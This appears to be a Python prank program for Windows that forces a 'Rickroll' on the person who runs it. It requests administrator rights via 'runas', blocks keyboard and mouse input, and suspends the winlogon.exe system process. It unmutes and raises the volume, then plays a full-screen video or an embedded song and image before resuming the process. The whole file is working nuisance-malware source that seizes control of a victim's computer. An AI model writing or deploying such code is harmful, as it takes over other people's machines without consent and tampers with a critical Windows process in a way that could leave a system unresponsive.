import random
import time
import base64
import ctypes as ct
import sys
import os
import webbrowser

import pygame
import pyautogui
import psutil
import urllib3

# 音量调整模块
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL

# 图片、音频base64文件
from rick_base64_data import rick_mp3
from pic_base64_data import pic_png

# 获取PC屏幕分辨率
X, Y = pyautogui.size()


def get_pid(name):
    infos = psutil.process_iter()
    for each in infos:
        if each.name() == name:
            return each.pid


def is_connected():
    """检测网络链接"""
    try:
        http = urllib3.PoolManager()
        http.request('GET', 'https://baidu.com')
        return True
    except:
        return False


def sound_open():
    """检测静音，调成非静音，并调整音量"""
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    mute = volume.GetMute()  # 静音标识符
    if mute == 1:  # 静音
        volume.SetMute(0, None)

    # 音量随机 50-100
    db = random.uniform(-10.3, 0.0)
    volume.SetMasterVolumeLevel(db, None)


def play_music():
    """播放音乐,base64文件"""
    sound_open()  # 音量调整
    # base64转二进制文件
    with open('tmp.mp3', 'wb') as w:
        w.write(base64.b64decode(rick_mp3))
    # 播放模块
    pygame.mixer.init()
    pygame.mixer.music.load('tmp.mp3')
    pygame.mixer.music.play(1)
    while pygame.mixer.music.get_busy():  # 放完为止
        pass
    pygame.mixer.music.unload()  # 卸载
    os.remove("tmp.mp3")  # 删除


def play_video():
    """浏览器播放视频"""
    webbrowser.open("https://vdse.bdstatic.com//192d9a98d782d9c74c96f09db9378d93.mp4")

    # 移除光标显示
    pyautogui.FAILSAFE = False
    pyautogui.move((X, Y))

    time.sleep(1)

    pyautogui.press("f11")

    time.sleep(1)

    pyautogui.click(X / 2, Y / 2, 2)
    pyautogui.move((X, Y))

    time.sleep(214)

    pyautogui.hotkey('alt', 'F4')  # 关闭浏览器


class Picture:
    def __init__(self, window):
        self.screen = window.screen
        self.screen_rect = window.screen.get_rect()

        with open('tmp.png', 'wb') as w:
            w.write(base64.b64decode(pic_png))
        image = pygame.image.load('tmp.png')
        os.remove("tmp.png")

        # 缩放图片到窗口大小
        self.image = pygame.transform.scale(image, (X, Y))

    def blitme(self):
        """在指定位置绘制图片"""
        self.screen.blit(self.image, (0, 0))


class Window:
    def __init__(self):
        # 检查软件包是否完整(初始化)
        pygame.init()
        self.screen = pygame.display.set_mode((X, Y))
        pygame.display.set_caption("Python")
        self.pic = Picture(self)

    def display_window(self):
        """在窗口上绘制图片"""
        self.screen.fill((0, 0, 0))
        self.pic.blitme()
        pygame.display.flip()


def is_admin():
    try:
        return ct.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin():
    if is_connected():
        # 屏蔽键鼠
        wd = ct.windll.LoadLibrary('user32.dll')
        wd.BlockInput(True)
        pid = get_pid("winlogon.exe")
        if pid:
            proc = psutil.Process(pid)

            proc.suspend()  # 挂起

            play_video()

            proc.resume()  # 恢复
            exit(0)

    if not is_connected():
        # 屏蔽键鼠
        wd = ct.windll.LoadLibrary('user32.dll')
        wd.BlockInput(True)

        # 移除光标显示
        pyautogui.FAILSAFE = False
        pyautogui.move((X, Y))

        pid = get_pid("winlogon.exe")
        if pid:
            proc = psutil.Process(pid)

            proc.suspend()  # 挂起

            window = Window()
            window.display_window()
            play_music()

            proc.resume()  # 恢复
            exit(0)

else:
    # 以管理员权限重新运行程序
    ct.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 0)
